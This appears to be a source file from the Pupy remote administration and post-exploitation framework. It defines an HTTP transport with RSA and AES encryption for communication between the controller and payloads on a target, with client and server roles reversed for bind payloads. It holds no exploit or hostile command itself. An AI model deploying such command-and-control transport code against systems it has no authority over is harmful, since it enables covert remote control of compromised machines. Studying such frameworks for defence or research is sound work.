# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from network.transports import *
from network.lib import *


class TransportConf(Transport):
    info = "TCP transport using HTTP with RSA+AES"
    name = "http"
    server = PupyTCPServer
    client = PupyTCPClient
    stream = PupySocketStream
    credentials = ["RSA_PUB_KEY"]
    def __init__(self, *args, **kwargs):
        Transport.__init__(self, *args, **kwargs)
        try:
            import pupy_credentials
            rsa_pub_key=pupy_credentials.RSA_PUB_KEY
        except:
            rsa_pub_key=DEFAULT_RSA_PUB_KEY

        if self.launcher_type == LAUNCHER_TYPE_BIND: #reversing the RSA client/server for BIND payloads so the private key doesn't go on the target
            self.client_transport = chain_transports(
                    PupyHTTPClient.custom(keep_alive=True),
                    RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
                )
            self.server_transport = chain_transports(
                    PupyHTTPServer,
                    RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
                )

        else:
            self.client_transport = chain_transports(
                    PupyHTTPClient.custom(keep_alive=True),
                    RSA_AESClient.custom(pubkey=DEFAULT_RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
                )
            self.server_transport = chain_transports(
                    PupyHTTPServer,
                    RSA_AESServer.custom(privkey_path="crypto/rsa_private_key.pem", rsa_key_size=4096, aes_size=256),
                )

